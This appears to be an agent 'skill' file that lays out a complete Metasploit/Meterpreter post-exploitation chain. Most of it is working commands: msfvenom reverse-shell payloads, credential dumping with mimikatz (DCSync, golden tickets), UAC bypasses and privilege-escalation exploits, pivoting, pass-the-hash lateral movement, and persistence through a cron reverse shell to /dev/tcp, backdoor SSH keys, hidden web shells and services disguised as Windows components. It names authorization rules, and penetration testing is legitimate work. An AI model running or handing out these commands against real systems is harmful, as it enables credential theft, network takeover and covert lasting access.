---
name: metasploit-post-exploit
description: Complete Metasploit/Meterpreter post-exploitation workflow â€” from initial shell to full domain compromise. Covers shell upgrade, enumeration, credential harvesting, privilege escalation, pivoting, lateral movement, and persistence.
---

# Metasploit Post-Exploitation Skill

## Overview
Master the full Metasploit post-exploitation kill chain using msfconsole and Meterpreter.
This skill covers every phase from catching an initial shell through credential harvesting,
privilege escalation, network pivoting, lateral movement, and persistence establishment.

**Kill Chain:** Shell â†’ Meterpreter Upgrade â†’ Sysinfo â†’ Hashdump â†’ Mimikatz â†’ Pivot â†’ Lateral Move â†’ Persist

## Scope Rules
1. Only operate on explicitly authorized targets within defined scope.
2. Meterpreter sessions must originate from authorized exploitation.
3. Credential dumping requires POST_EXPLOIT phase authorization.
4. Persistence requires explicit `ALLOW_PERSISTENCE=true`.
5. Pivoting to new subnets requires scope expansion authorization.
6. Always document all actions for cleanup and reporting.

---

## Chain From (Input from Prior Phases)
- **Exploitation** â†’ initial shell (reverse TCP, bind, web shell)
- **C2 Deploy** â†’ established C2 session with Meterpreter handler
- **Credential Access** â†’ passwords/hashes for authenticated exploitation

## Chain To (Output to Next Phases)
- **Credential Access** â†’ harvested hashes, tokens, cleartext creds
- **Lateral Movement** â†’ psexec/wmi sessions to new hosts
- **Persistence** â†’ registry keys, services, scheduled tasks
- **Reporting** â†’ evidence.json, creds.json, lateral.json, persistence.json

---

## Â§1 â€” Shell to Meterpreter Upgrade

### 1.1 Catching the Initial Shell
```
# Handler for Windows x64 staged Meterpreter
msfconsole -q -x '
use exploit/multi/handler
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT 4444
set ExitOnSession false
exploit -j -z
'

# Handler for Linux x64 staged Meterpreter
msfconsole -q -x '
use exploit/multi/handler
set PAYLOAD linux/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT 4444
set ExitOnSession false
exploit -j -z
'
```

### 1.2 Upgrading a Raw Shell to Meterpreter
```
# From within msfconsole â€” upgrade existing shell session to Meterpreter
sessions -u <SESSION_ID>

# Alternative: use post module
use post/multi/manage/shell_to_meterpreter
set SESSION <SESSION_ID>
set LHOST <LHOST>
set LPORT 4433
run

# Verify upgrade succeeded
sessions -l
sessions -i <NEW_METERPRETER_SESSION_ID>
```

### 1.3 Stabilizing the Session
```
# In Meterpreter â€” migrate to a stable process
# Windows: migrate to explorer.exe or svchost.exe
ps
migrate <PID_OF_STABLE_PROCESS>

# Set transport fallback for session persistence
transport add -t reverse_tcp -l <LHOST> -p 5555

# Enable session auto-reconnect
set AutoRunScript post/multi/manage/autoroute

# Background the session
background
```

### 1.4 Generating Payloads with msfvenom
```bash
# Windows x64 staged Meterpreter (exe)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell.exe

# Windows x64 stageless (better for unstable connections)
msfvenom -p windows/x64/meterpreter_reverse_tcp LHOST=<LHOST> LPORT=4444 -f exe -o shell_stageless.exe

# Linux x64 ELF
msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f elf -o shell.elf

# PowerShell one-liner (fileless)
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f psh-cmd -o shell.ps1

# Java WAR (Tomcat/JBoss)
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<LHOST> LPORT=4444 -f war -o shell.war

# Python (cross-platform)
msfvenom -p python/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f raw -o shell.py

# PHP web shell (via Meterpreter)
msfvenom -p php/meterpreter/reverse_tcp LHOST=<LHOST> LPORT=4444 -f raw -o shell.php
```

---

## Â§2 â€” System Enumeration (Situational Awareness)

### 2.1 Core Enumeration (ALWAYS run first)
```
# Meterpreter commands â€” run ALL of these immediately after session
sysinfo
getuid
getpid
getsid
ipconfig
route
arp

# Network awareness
netstat -ano
resolve <HOSTNAME>

# Process listing (identify AV, EDR, interesting processes)
ps

# Check privileges
getprivs
```

### 2.2 Automated Enumeration Modules
```
# Windows local enumeration
run post/windows/gather/enum_system
run post/windows/gather/enum_logged_on_users
run post/windows/gather/enum_applications
run post/windows/gather/enum_patches
run post/windows/gather/enum_shares
run post/windows/gather/enum_domain
run post/windows/gather/enum_domain_group_users
run post/windows/gather/checkvm

# Linux local enumeration
run post/linux/gather/enum_system
run post/linux/gather/enum_network
run post/linux/gather/enum_users_history
run post/linux/gather/checkvm
run post/linux/gather/enum_configs

# Multi-platform
run post/multi/gather/env
run post/multi/gather/ssh_creds
```

### 2.3 Network Discovery (Internal Recon)
```
# ARP scan from compromised host
run post/multi/gather/ping_sweep RHOSTS=<INTERNAL_SUBNET>/24

# Port scan through Meterpreter session
run post/multi/gather/multi_command RESOURCE=/tmp/enum.rc

# Enumerate domain (Windows)
run post/windows/gather/enum_ad_computers
run post/windows/gather/enum_ad_users
run post/windows/gather/enum_ad_groups
```

---

## Â§3 â€” Credential Harvesting

### 3.1 Hashdump (SAM Database) ğŸŸ¡
**MITRE: T1003.002 â€” Security Account Manager**
```
# Requires SYSTEM or admin privileges
hashdump

# Alternative post module (more reliable)
run post/windows/gather/hashdump

# Smart hashdump (tries multiple methods)
run post/windows/gather/smart_hashdump

# Output format: username:rid:lm_hash:ntlm_hash:::
# Save to file for offline cracking
```

### 3.2 Mimikatz via Kiwi Extension ğŸŸ¡
**MITRE: T1003.001 â€” LSASS Memory**
```
# Load the kiwi extension (mimikatz integrated into Meterpreter)
load kiwi

# Dump all credentials from memory
creds_all

# Dump specific credential types
creds_msv        # MSV credentials (NTLM hashes)
creds_wdigest    # WDigest cleartext passwords (if enabled)
creds_kerberos   # Kerberos tickets
creds_ssp        # SSP credentials
creds_livessp    # LiveSSP credentials
creds_tspkg      # TsPkg credentials

# Alternative: run mimikatz commands directly
kiwi_cmd sekurlsa::logonpasswords
kiwi_cmd lsadump::sam
kiwi_cmd lsadump::secrets
kiwi_cmd lsadump::cache

# Golden Ticket creation (requires krbtgt hash)
kiwi_cmd "kerberos::golden /user:Administrator /domain:<DOMAIN> /sid:<DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /ptt"

# DCSync (requires domain admin or replication rights)
kiwi_cmd "lsadump::dcsync /domain:<DOMAIN> /user:Administrator"
kiwi_cmd "lsadump::dcsync /domain:<DOMAIN> /all /csv"
```

### 3.3 Token Impersonation ğŸŸ¡
**MITRE: T1134.001 â€” Token Impersonation/Theft**
```
# Load incognito extension
load incognito

# List available tokens
list_tokens -u    # List by user
list_tokens -g    # List by group

# Impersonate a token (escalate to that user's context)
impersonate_token "<DOMAIN>\\<USERNAME>"
impersonate_token "NT AUTHORITY\\SYSTEM"

# Verify impersonation
getuid
shell
whoami
exit

# Steal token from specific process
steal_token <PID>

# Drop back to original token
rev2self
```

### 3.4 Credential Store Harvesting ğŸŸ¢
```
# Windows credential store
run post/windows/gather/credentials/credential_collector
run post/windows/gather/credentials/windows_autologin
run post/windows/gather/credentials/enum_cred_store

# Browser credentials
run post/multi/gather/firefox_creds
run post/windows/gather/enum_chrome_credentials
run post/windows/gather/enum_ie_credentials

# WiFi passwords
run post/windows/wlan/wlan_profile

# SSH keys
run post/multi/gather/ssh_creds

# Linux credential files
run post/linux/gather/hashdump
run post/linux/gather/enum_users_history
run post/linux/gather/phpmyadmin_credsteal
```

### 3.5 LSA Secrets & Cached Credentials ğŸŸ¡
**MITRE: T1003.004, T1003.005**
```
# LSA Secrets (service account passwords, VPN creds, etc.)
run post/windows/gather/lsa_secrets

# Cached domain credentials
run post/windows/gather/cachedump

# DPAPI secrets
run post/windows/gather/credentials/enum_cred_store
```

---

## Â§4 â€” Privilege Escalation via Metasploit

### 4.1 Getsystem (Quick SYSTEM) ğŸŸ¡
**MITRE: T1134 â€” Access Token Manipulation**
```
# Try all techniques automatically (Named Pipe Impersonation, Token Duplication)
getsystem

# Specify technique (1=Named Pipe, 2=Named Pipe (DLL drop), 3=Token Duplication)
getsystem -t 1

# Verify
getuid
# Should show: NT AUTHORITY\SYSTEM
```

### 4.2 Local Exploit Suggester ğŸŸ¢
**MITRE: T1068 â€” Exploitation for Privilege Escalation**
```
# Run exploit suggester against current session
run post/multi/recon/local_exploit_suggester

# This will list applicable local exploits. Example output:
#   exploit/windows/local/always_install_elevated
#   exploit/windows/local/bypassuac_eventvwr
#   exploit/windows/local/ms16_075_reflection_juicy
#   exploit/windows/local/cve_2021_1732_win32k

# Execute a suggested exploit
background
use exploit/windows/local/bypassuac_eventvwr
set SESSION <SESSION_ID>
set LHOST <LHOST>
set LPORT 5555
exploit
```

### 4.3 UAC Bypass Modules ğŸŸ¡
**MITRE: T1548.002 â€” Bypass User Account Control**
```
# Common UAC bypasses (run from msfconsole with SESSION set)
use exploit/windows/local/bypassuac_eventvwr
use exploit/windows/local/bypassuac_fodhelper
use exploit/windows/local/bypassuac_comhijack
use exploit/windows/local/bypassuac_dotnet_profiler
use exploit/windows/local/bypassuac_sdclt
use exploit/windows/local/bypassuac_silentcleanup

# Template for all UAC bypasses:
set SESSION <SESSION_ID>
set LHOST <LHOST>
set LPORT <NEW_PORT>
set TARGET 0
exploit
```

### 4.4 Named Pipe & Potato Exploits ğŸŸ¡
```
# Juicy Potato via Metasploit (SeImpersonate â†’ SYSTEM)
use exploit/windows/local/ms16_075_reflection_juicy
set SESSION <SESSION_ID>
exploit

# PrintSpoofer
use exploit/windows/local/cve_2020_1048_printerdemon
set SESSION <SESSION_ID>
exploit

# Always check token privileges first:
getprivs
# Look for: SeImpersonatePrivilege, SeAssignPrimaryTokenPrivilege
```

### 4.5 Linux Privilege Escalation Modules ğŸŸ¡
```
# Sudo exploitation
use exploit/linux/local/sudo_baron_samedit
set SESSION <SESSION_ID>
exploit

# PwnKit (pkexec CVE-2021-4034)
use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec
set SESSION <SESSION_ID>
exploit

# DirtyPipe (CVE-2022-0847)
use exploit/linux/local/cve_2022_0847_dirtypipe
set SESSION <SESSION_ID>
exploit

# OverlayFS
use exploit/linux/local/overlayfs_priv_esc
set SESSION <SESSION_ID>
exploit

# General suggester
run post/multi/recon/local_exploit_suggester
```

---

## Â§5 â€” Pivoting (Network Routing & Port Forwarding)

### 5.1 AutoRoute (Layer 3 Pivot) ğŸŸ¢
```
# Add route through Meterpreter session to reach internal network
run autoroute -s <INTERNAL_SUBNET>/24
# Example: run autoroute -s 10.10.10.0/24

# List active routes
run autoroute -p

# Delete a route
run autoroute -d -s <INTERNAL_SUBNET>/24

# Alternative: use the post module
run post/multi/manage/autoroute SUBNET=<INTERNAL_SUBNET> NETMASK=255.255.255.0 SESSION=<SESSION_ID>
```

### 5.2 SOCKS Proxy (Proxychains) ğŸŸ¢
```
# Start SOCKS4a proxy through session (for proxychains)
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
set VERSION 4a
run -j

# Configure proxychains (/etc/proxychains4.conf)
# Add: socks4 127.0.0.1 1080

# Now use any tool through the pivot:
# proxychains nmap -sT -Pn <INTERNAL_TARGET>
# proxychains crackmapexec smb <INTERNAL_TARGET>
# proxychains evil-winrm -i <INTERNAL_TARGET> -u admin -p password

# SOCKS5 (with authentication support)
use auxiliary/server/socks_proxy
set VERSION 5
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j
```

### 5.3 Port Forwarding ğŸŸ¢
```
# Local port forward: make remote service accessible locally
portfwd add -l <LOCAL_PORT> -p <REMOTE_PORT> -r <REMOTE_HOST>
# Example: portfwd add -l 3389 -p 3389 -r 10.10.10.5
# Now: rdesktop 127.0.0.1:3389

# Reverse port forward: expose attacker service to internal network
portfwd add -R -l <ATTACKER_PORT> -p <LOCAL_PORT> -L <ATTACKER_IP>

# List active forwards
portfwd list

# Delete a forward
portfwd delete -l <LOCAL_PORT> -p <REMOTE_PORT> -r <REMOTE_HOST>

# Flush all forwards
portfwd flush

# Common port forward examples:
portfwd add -l 445  -p 445  -r <TARGET>  # SMB
portfwd add -l 3389 -p 3389 -r <TARGET>  # RDP
portfwd add -l 5985 -p 5985 -r <TARGET>  # WinRM
portfwd add -l 22   -p 22   -r <TARGET>  # SSH
portfwd add -l 1433 -p 1433 -r <TARGET>  # MSSQL
portfwd add -l 3306 -p 3306 -r <TARGET>  # MySQL
portfwd add -l 80   -p 80   -r <TARGET>  # HTTP
```

### 5.4 Double Pivot (Multi-Hop)
```
# Scenario: Attacker â†’ Host A (10.10.10.0/24) â†’ Host B (172.16.0.0/24)

# 1. Establish session on Host A
# 2. Add route to 10.10.10.0/24 via Session 1
run autoroute -s 10.10.10.0/24

# 3. Exploit Host B through the route to get Session 2
# 4. Add route to 172.16.0.0/24 via Session 2
sessions -i 2
run autoroute -s 172.16.0.0/24

# 5. Start SOCKS proxy
background
use auxiliary/server/socks_proxy
set SRVHOST 127.0.0.1
set SRVPORT 1080
run -j

# 6. Now traffic to 172.16.0.0/24 routes: Attacker â†’ Session 1 â†’ Session 2 â†’ Target
# proxychains nmap -sT -Pn 172.16.0.5
```

---

## Â§6 â€” Lateral Movement via Metasploit

### 6.1 PsExec (Pass-the-Hash / Pass-the-Password) ğŸŸ¡
**MITRE: T1021.002 â€” SMB/Windows Admin Shares**
```
# PsExec with password
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
set SMBDomain <DOMAIN>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <NEW_PORT>
exploit

# PsExec with NTLM hash (Pass-the-Hash)
use exploit/windows/smb/psexec
set RHOSTS <TARGET_IP>
set SMBUser Administrator
set SMBPass <LM_HASH>:<NTLM_HASH>
set SMBDomain <DOMAIN>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <NEW_PORT>
exploit

# PsExec via Meterpreter's command
# (uses current session's credentials)
run post/windows/manage/psexec_command RHOSTS=<TARGET_IP> COMMAND="whoami"
```

### 6.2 WMI Execution ğŸŸ¡
**MITRE: T1047 â€” Windows Management Instrumentation**
```
# WMI command execution
use exploit/windows/local/wmi
set RHOSTS <TARGET_IP>
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
set SMBDomain <DOMAIN>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <NEW_PORT>
exploit

# Alternative: WMI exec post module
run post/windows/manage/wmi_exec HOST=<TARGET_IP> USER=<USER> PASS=<PASS> COMMAND="whoami"
```

### 6.3 SSH Lateral Movement (Linux) ğŸŸ¢
```
# If SSH keys were harvested
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <TARGET_IP>
set USERNAME <USER>
set SSH_KEYFILE /path/to/stolen_key
run

# With password
use auxiliary/scanner/ssh/ssh_login
set RHOSTS <TARGET_IP>
set USERNAME root
set PASSWORD <PASSWORD>
run

# Upgrade to Meterpreter
sessions -u <SESSION_ID>
```

### 6.4 SMB Relay & Pass-the-Hash Variants ğŸŸ¡
```
# SMB pipe execution (stealthier than PsExec)
use exploit/windows/smb/psexec_psh
set RHOSTS <TARGET_IP>
set SMBUser <USERNAME>
set SMBPass <LM_HASH>:<NTLM_HASH>
exploit

# Named pipe execution
use exploit/windows/smb/ms17_010_psexec
set RHOSTS <TARGET_IP>
set SMBUser <USERNAME>
set SMBPass <PASSWORD>
exploit
```

### 6.5 WinRM Lateral Movement ğŸŸ¢
**MITRE: T1021.006 â€” Windows Remote Management**
```
# WinRM shell
use auxiliary/scanner/winrm/winrm_login
set RHOSTS <TARGET_IP>
set USERNAME <USER>
set PASSWORD <PASS>
set DOMAIN <DOMAIN>
run

# WinRM command execution
use auxiliary/scanner/winrm/winrm_cmd
set RHOSTS <TARGET_IP>
set USERNAME <USER>
set PASSWORD <PASS>
set CMD "whoami /all"
run
```

---

## Â§7 â€” Persistence via Metasploit

> âš ï¸ **Persistence requires explicit authorization (ALLOW_PERSISTENCE=true)**

### 7.1 Registry Persistence (Windows) ğŸŸ¡
**MITRE: T1547.001 â€” Registry Run Keys**
```
# Add registry autorun (survives reboot)
run post/windows/manage/persistence_exe
  # or
run persistence -U -i 30 -p <LPORT> -r <LHOST>

# Registry run key persistence
run post/windows/manage/registry_persistence
  # Sets HKCU\Software\Microsoft\Windows\CurrentVersion\Run

# Detailed control:
use exploit/windows/local/persistence
set SESSION <SESSION_ID>
set LHOST <LHOST>
set LPORT <LPORT>
set STARTUP USER    # USER or SYSTEM
set REG_NAME svchost_update
exploit
```

### 7.2 Scheduled Task Persistence (Windows) ğŸŸ¡
**MITRE: T1053.005 â€” Scheduled Task**
```
# Create scheduled task that runs payload on logon
run post/windows/manage/schtasks_exec CMD="powershell -ep bypass -w hidden -e <BASE64_PAYLOAD>" TASKNAME="WindowsUpdate" SCHEDULE="ONLOGON"

# Via msfconsole module
use exploit/windows/local/persistence_service
set SESSION <SESSION_ID>
set LHOST <LHOST>
set LPORT <LPORT>
exploit

# Alternative: write a .rc script
# schtasks /create /tn "SystemHealthCheck" /tr "C:\Windows\Temp\svc.exe" /sc ONLOGON /ru SYSTEM /f
```

### 7.3 Service Persistence (Windows) ğŸŸ¡
**MITRE: T1543.003 â€” Windows Service**
```
# Create a persistent service
run post/windows/manage/persistence_exe REXEPATH=/tmp/payload.exe STARTUP=SERVICE LOCALEXEPATH=C:\\Windows\\Temp\\svc.exe

# Meterpreter service installer
use exploit/windows/local/persistence_service
set SESSION <SESSION_ID>
set PAYLOAD windows/x64/meterpreter/reverse_tcp
set LHOST <LHOST>
set LPORT <LPORT>
set SERVICE_NAME "WindowsHealthSvc"
set SERVICE_DESCRIPTION "Windows Health Monitoring Service"
exploit
```

### 7.4 SSH Key Persistence (Linux) ğŸŸ¢
**MITRE: T1098.004 â€” SSH Authorized Keys**
```
# Add SSH key for persistent access
run post/linux/manage/sshkey_persistence
  # Generates key pair and adds to authorized_keys

# Manual approach via Meterpreter shell:
shell
ssh-keygen -t ed25519 -f /tmp/backdoor_key -N ""
cat /tmp/backdoor_key.pub >> /root/.ssh/authorized_keys
chmod 600 /root/.ssh/authorized_keys
cat /tmp/backdoor_key
# Save private key on attacker machine
exit
```

### 7.5 Cron Persistence (Linux) ğŸŸ¡
**MITRE: T1053.003 â€” Cron**
```
# Add cron job for reverse shell callback
shell
(crontab -l 2>/dev/null; echo "*/5 * * * * /bin/bash -c 'bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1'") | crontab -
exit

# Via post module
run post/linux/manage/cron_persistence
```

### 7.6 Web Shell Persistence ğŸŸ¡
**MITRE: T1505.003 â€” Web Shell**
```
# Deploy PHP web shell
upload /usr/share/webshells/php/php-reverse-shell.php /var/www/html/.status.php

# ASP.NET web shell
upload /path/to/shell.aspx C:\\inetpub\\wwwroot\\.diagnostics.aspx

# JSP web shell
upload /path/to/shell.jsp /opt/tomcat/webapps/ROOT/.health.jsp
```

---

## Â§8 â€” Full Post-Exploitation Workflow (RC Script)

### 8.1 Automated Post-Exploitation RC Script
```
# Save as /tmp/postexploit.rc and run with: msfconsole -q -r /tmp/postexploit.rc

# === PHASE 1: Session Enumeration ===
<ruby>
framework.sessions.each do |id, session|
  if session.type == "meterpreter"
    print_good("Processing Meterpreter session #{id}")
    session.sys.config.sysinfo.each { |k,v| print_line("  #{k}: #{v}") }
    print_line("  User: #{session.sys.config.getuid}")
    print_line("  PID:  #{session.sys.process.getpid}")
  end
end
</ruby>

# === PHASE 2: Credential Harvesting ===
use post/windows/gather/hashdump
set SESSION 1
run
use post/windows/gather/smart_hashdump
set SESSION 1
run
use post/windows/gather/cachedump
set SESSION 1
run

# === PHASE 3: Privilege Escalation ===
use post/multi/recon/local_exploit_suggester
set SESSION 1
run

# === PHASE 4: Pivoting ===
use post/multi/manage/autoroute
set SESSION 1
run
```

### 8.2 One-Liner Workflow (Single msfconsole Command)
```bash
# Complete post-exploitation in a single command
msfconsole -q -x '
sessions -i 1;
sysinfo;
getuid;
getprivs;
getsystem;
hashdump;
load kiwi;
creds_all;
run autoroute -s <SUBNET>/24;
run post/multi/recon/local_exploit_suggester;
background;
use auxiliary/server/socks_proxy;
set SRVHOST 127.0.0.1;
set SRVPORT 1080;
run -j;
'
```

---

## Decision Tree â€” "What Do You Have?"

```
[Meterpreter Session Obtained]
        â”‚
        â”œâ”€â”€ Check: getuid
        â”‚   â”œâ”€â”€ NT AUTHORITY\SYSTEM â”€â”€â”€â”€ Skip to Â§3 (Credential Harvesting)
        â”‚   â”œâ”€â”€ Admin user â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Â§4.1 getsystem â†’ Â§3
        â”‚   â”œâ”€â”€ Standard user â”€â”€â”€â”€â”€â”€â”€ Â§4.2 Local Exploit Suggester â†’ Â§4.3 UAC Bypass
        â”‚   â””â”€â”€ Service account â”€â”€â”€â”€â”€â”€ Â§3.3 Token Impersonation â†’ Â§4.4 Potato exploits
        â”‚
        â”œâ”€â”€ After Credentials Harvested
        â”‚   â”œâ”€â”€ Got NTLM hashes? â”€â”€â”€â”€â”€ Â§6.1 PsExec (Pass-the-Hash)
        â”‚   â”œâ”€â”€ Got cleartext? â”€â”€â”€â”€â”€â”€â”€ Â§6.1-6.5 Any lateral technique
        â”‚   â”œâ”€â”€ Got Kerberos tickets? â”€ Â§6.4 Pass-the-Ticket
        â”‚   â””â”€â”€ Got SSH keys? â”€â”€â”€â”€â”€â”€â”€ Â§6.3 SSH lateral movement
        â”‚
        â”œâ”€â”€ Multiple Subnets Visible?
        â”‚   â”œâ”€â”€ YES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Â§5 Pivoting (autoroute + SOCKS)
        â”‚   â”‚   â”œâ”€â”€ Scan new subnet â”€â”€ proxychains nmap
        â”‚   â”‚   â””â”€â”€ Exploit through pivot â”€â”€ Â§6 Lateral Movement
        â”‚   â””â”€â”€ NO â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Focus on current subnet
        â”‚
        â””â”€â”€ Persistence Authorized?
            â”œâ”€â”€ YES â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Â§7 (Registry/Service/Cron/SSH Key)
            â””â”€â”€ NO â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ Document and report only
```

### OPSEC Legend: ğŸŸ¢ Quiet (in-memory) | ğŸŸ¡ Moderate (disk writes/logs) | ğŸ”´ Loud (service creation/alerts)

---

## Failure Recovery

| Technique | Common Failure | Recovery |
|-----------|---------------|----------|
| Shell upgrade | Upgrade fails/dies | Use `post/multi/manage/shell_to_meterpreter` with explicit LHOST/LPORT |
| getsystem | Access denied | Run `local_exploit_suggester`, try UAC bypass, check token privs |
| hashdump | Insufficient privileges | Get SYSTEM first via getsystem or token impersonation |
| load kiwi | Module not found | Ensure session is x64; migrate to 64-bit process if needed |
| creds_all | No credentials found | Try `creds_wdigest` separately; check if WDigest is disabled (reg add to enable) |
| autoroute | Route not working | Verify subnet is correct; check `run autoroute -p`; ensure session is alive |
| portfwd | Connection refused | Verify target port is open; check firewall rules on pivot host |
| PsExec | Access denied | Try psexec_psh variant; verify credentials; check if SMB is blocked |
| Token impersonation | No tokens available | Migrate to process running as target user; try `steal_token <PID>` |
| Persistence | Detected/blocked | Use fileless persistence; try different mechanism; check AV exclusions |

---

## Deep Dives (Reference Files)
Load these for specialized techniques:

| # | Topic | File | Level |
|---|-------|------|-------|
| 1 | Meterpreter Commands | `references/meterpreter_commands.md` | Core |
| 2 | Credential Techniques | `references/credential_techniques.md` | Core |
| 3 | Pivot & Tunnel Guide | `references/pivot_tunnel_guide.md` | Core |
| 4 | Lateral Movement Modules | `references/lateral_movement_modules.md` | Core |
| 5 | Persistence Mechanisms | `references/persistence_mechanisms.md` | Core |
| 6 | OPSEC Guide | `references/opsec_ratings.md` | Senior |
| 7 | Failure Recovery | `references/failure_recovery.md` | Senior |
| 8 | Advanced Post-Exploit Chains | `references/advanced_techniques.md` | Senior |

---

## Evidence Collection
1. `creds.json` â€” harvested credentials (hashes, tokens, cleartext â€” REDACTED in reports)
2. `priv_esc.json` â€” privilege escalation path documentation
3. `lateral.json` â€” lateral movement sessions and paths
4. `persistence.json` â€” persistence mechanisms deployed (with cleanup instructions)
5. `evidence.json` â€” raw command output and screenshots
6. `findings.json` â€” risk assessment per technique

## Success Criteria
- Meterpreter session upgraded and stabilized
- System enumeration completed with network awareness
- Credentials harvested and validated
- Privilege escalation achieved or documented as unavailable
- Pivoting configured for multi-subnet access (if applicable)
- Lateral movement executed to additional hosts (if credentials available)
- Persistence established (if authorized) with cleanup documentation
